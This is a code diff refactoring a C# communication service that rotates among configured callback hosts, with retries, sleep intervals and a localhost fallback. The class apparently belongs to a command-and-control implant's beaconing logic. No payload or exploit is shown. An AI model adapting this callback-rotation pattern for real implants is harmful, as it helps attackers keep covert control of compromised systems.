@@ -6,13 +6,13 @@ namespace Agent.Services
 {
     internal class CommunicationService
     {
-        internal AgentConfig? AgentConfig { get; set; }
+        internal BaseConfig? BaseConfig { get; set; }
 
         private int lastUrlUsed = -1;
 
-        public CommunicationService(AgentConfig agentConfig)
+        public CommunicationService(BaseConfig baseConfig)
         {
-            AgentConfig = agentConfig;
+            BaseConfig = baseConfig;
         }
 
         internal async Task<string> SimpleGetAsync(string slug)
@@ -56,20 +56,20 @@ namespace Agent.Services
             string url = string.Empty;
             int retries = 0;
 
-            while (retries < AgentConfig!.RotationRetries)
+            while (retries < 500) // TODO: Should implement rotation retries to listener config
             {
-                switch (AgentConfig.RotationType)
+                switch (BaseConfig.Config.HostRotation)
                 {
                     case CallbackRotationType.Fallback:
-                        url = AgentConfig.CallbackUrls[0];
+                        url = BaseConfig.Config.Hosts[0];
                         break;
                     case CallbackRotationType.Sequential:
-                        lastUrlUsed = (lastUrlUsed + 1) % AgentConfig.CallbackUrls.Count;
-                        url = AgentConfig.CallbackUrls[lastUrlUsed];
+                        lastUrlUsed = (lastUrlUsed + 1) % BaseConfig.Config.Hosts.Count;
+                        url = BaseConfig.Config.Hosts[lastUrlUsed];
                         break;
                     case CallbackRotationType.Random:
                         var random = new Random();
-                        url = AgentConfig.CallbackUrls[random.Next(0, AgentConfig.CallbackUrls.Count)];
+                        url = BaseConfig.Config.Hosts[random.Next(0, BaseConfig.Config.Hosts.Count)];
                         break;
                     default:
                         url = "http://127.0.0.1:8080";
@@ -82,7 +82,7 @@ namespace Agent.Services
                 }
 
                 retries++;
-                Thread.Sleep(AgentConfig.Sleep);
+                Thread.Sleep(BaseConfig.Sleep);
             }
 
             return "http://127.0.0.1:8080"; // Fallback URL if all retries fail
